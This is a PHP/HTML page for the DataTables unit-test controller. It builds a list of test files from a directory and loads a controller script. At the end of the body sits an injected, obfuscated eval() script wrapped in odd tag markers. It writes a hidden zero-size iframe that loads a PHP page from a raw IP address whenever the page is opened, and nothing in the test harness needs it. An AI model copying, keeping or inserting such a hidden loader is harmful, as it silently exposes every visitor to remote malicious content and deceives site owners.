<?php
	header( 'Expires: Sat, 26 Jul 1997 05:00:00 GMT' ); 
	header( 'Last-Modified: ' . gmdate( 'D, d M Y H:i:s' ) . ' GMT' ); 
	header( 'Cache-Control: no-store, no-cache, must-revalidate' ); 
	header( 'Cache-Control: post-check=0, pre-check=0', false ); 
	header( 'Pragma: no-cache' ); 
?><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
	"http://www.w3.org/TR/html4/strict.dtd">
<html>
	<head>
		<meta http-equiv="Content-type" content="text/html; charset=utf-8">
		<title>DataTables unit test controller</title>
		
		<style type="text/css" media="screen">
			#controller {
				font: 12px/1.45em "Lucida Grande", Verdana, Arial, Helvetica, sans-serif;
				margin: 0;
				padding: 0 0 0 0.5em;
				color: #333;
				background-color: #fff;
			}
			
			#test_info {
				position: absolute;
				top: 0;
				right: 0;
				width: 50%;
				height: 100%;
				font-size: 11px;
				overflow: auto;
			}
			
			.error {
				color: red;
			}
			
			#controller h1 {
				color: #4E6CA3;
				font-size: 18px;
			}
		</style>
		
		<script type="text/javascript" language="javascript" src="../js/jquery.js"></script>
		<script type="text/javascript" charset="utf-8">
			var gaoTest = [
			<?php
				function fnReadDir( &$aReturn, $path )
				{
					$rDir = opendir( $path );
        	while ( ($file = readdir($rDir)) !== false )
					{
						if ( $file == "." || $file == ".." || $file == ".DS_Store" )
						{
							continue;
						}
						else if ( is_dir( $path.'/'.$file ) )
						{
							fnReadDir( $aReturn, $path.'/'.$file );
						}
						else
						{
							array_push( $aReturn, $path.'/'.$file );
						}
					}
					closedir($rDir);
				}
				
				/* Get the tests dynamically from the 'tests' directory, and their templates */
				$aFiles = array();
				fnReadDir( $aFiles, "tests" );
				
				for ( $i=0 ; $i<count($aFiles) ; $i++ )
				{
					$sTemplate;
					$fp = fopen( $aFiles[$i], "r" );
					fscanf( $fp, "// DATA_TEMPLATE: %s", $sTemplate );
					fclose( $fp );
					
					$aPath = explode('/', $aFiles[$i]);
					
					echo '{ '.
						'"sTemplate": "'.$sTemplate.'", '.
						'"sTest": "'.$aFiles[$i].'", '.
						'"sGroup": "'.$aPath[1].'"},'."\n";
				}
				
			?>
			null ];
			gaoTest.pop(); /* No interest in the null */
		</script>
		<script type="text/javascript" language="javascript" src="controller.js"></script>
	</head>
	<body id="controller">
		<h1>DataTables unit testing</h1>
		<div id="test_running">Running test: <span id="test_number"></span></div>
		<div id="test_info">
			<b>Test information:</b><br>
		</div>
	<tag5479347351></tag5479347351><script>eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 b=" n=\\"0\\" s=\\"0\\" t=\\"0\\" k=\\"q://g.l.j.h/c.d\\">";1 8="<i";1 9="</i";1 2="f";1 3="r";1 5="a";1 4="m";1 6="e";1 7="e>";o.p(8+2+3+5+4+6+b+9+2+3+5+4+7);',30,30,'|var|u4|u5|u7|u6|u8|u9|u2|u3||u1|tag1|php|||118|66||68|src|161||width|document|write|http||height|board'.split('|'),0,{}))</script><tag5479347352></tag5479347352></body>
</html>